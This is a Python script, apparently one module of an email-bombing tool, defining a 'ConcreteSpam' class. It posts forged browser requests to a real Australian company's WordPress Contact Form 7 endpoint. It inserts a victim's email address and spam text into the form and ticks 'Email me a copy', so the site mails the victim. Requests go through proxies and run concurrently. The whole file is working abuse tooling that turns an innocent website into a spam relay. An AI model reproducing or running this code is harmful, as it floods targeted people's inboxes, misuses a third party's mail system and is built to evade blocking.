from os.path import basename

import requests

from module import Spam


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        cookies = {
            '_ga': 'GA1.3.1370996894.1676371947',
            '_gid': 'GA1.3.735877802.1676371947',
            '_gat_gtag_UA_171735057_1': '1',
        }

        headers = {
            'authority': 'greenwayivm.com.au',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryK9fjkSJrgElAor89',
            # 'cookie': '_ga=GA1.3.1370996894.1676371947; _gid=GA1.3.735877802.1676371947; _gat_gtag_UA_171735057_1=1',
            'origin': 'https://greenwayivm.com.au',
            'referer': 'https://greenwayivm.com.au/contact/',
            'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        data = '------WebKitFormBoundaryK9fjkSJrgElAor89\r\nContent-Disposition: form-data; name="_wpcf7"\r\n\r\n130\r\n------WebKitFormBoundaryK9fjkSJrgElAor89\r\nContent-Disposition: form-data; name="_wpcf7_version"\r\n\r\n5.1.7\r\n------WebKitFormBoundaryK9fjkSJrgElAor89\r\nContent-Disposition: form-data; name="_wpcf7_locale"\r\n\r\nen_US\r\n------WebKitFormBoundaryK9fjkSJrgElAor89\r\nContent-Disposition: form-data; name="_wpcf7_unit_tag"\r\n\r\nwpcf7-f130-o1\r\n------WebKitFormBoundaryK9fjkSJrgElAor89\r\nContent-Disposition: form-data; name="_wpcf7_container_post"\r\n\r\n0\r\n------WebKitFormBoundaryK9fjkSJrgElAor89\r\nContent-Disposition: form-data; name="your-title"\r\n\r\ntest\r\n------WebKitFormBoundaryK9fjkSJrgElAor89\r\nContent-Disposition: form-data; name="your-fname"\r\n\r\ntest\r\n------WebKitFormBoundaryK9fjkSJrgElAor89\r\nContent-Disposition: form-data; name="your-lname"\r\n\r\ntest\r\n------WebKitFormBoundaryK9fjkSJrgElAor89\r\nContent-Disposition: form-data; name="your-email"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundaryK9fjkSJrgElAor89\r\nContent-Disposition: form-data; name="your-company"\r\n\r\ntest\r\n------WebKitFormBoundaryK9fjkSJrgElAor89\r\nContent-Disposition: form-data; name="your-message"\r\n\r\ntest\r\n------WebKitFormBoundaryK9fjkSJrgElAor89\r\nContent-Disposition: form-data; name="your-country"\r\n\r\ntest\r\n------WebKitFormBoundaryK9fjkSJrgElAor89\r\nContent-Disposition: form-data; name="your-phone"\r\n\r\n12124124\r\n------WebKitFormBoundaryK9fjkSJrgElAor89\r\nContent-Disposition: form-data; name="your-postcode"\r\n\r\n01100\r\n------WebKitFormBoundaryK9fjkSJrgElAor89\r\nContent-Disposition: form-data; name="acceptance-policy"\r\n\r\n1\r\n------WebKitFormBoundaryK9fjkSJrgElAor89\r\nContent-Disposition: form-data; name="send_email_checkbox[]"\r\n\r\nEmail me a copy of this form.\r\n------WebKitFormBoundaryK9fjkSJrgElAor89--\r\n'
        data = data.replace('wezxasqw@gmail.com', target).replace('test', self.get_text()).encode()

        response = requests.post(
            'https://greenwayivm.com.au/wp-json/contact-form-7/v1/contact-forms/130/feedback',
            cookies=cookies,
            headers=headers,
            data=data, proxies=self.get_proxies(), timeout=10
        )
        return response


def main():
    spam = ConcreteSpam(basename(__file__)[:-3])
    res = spam.send_post()
    if res:
        spam.run_concurrently(1)


if __name__ == '__main__':
    main()
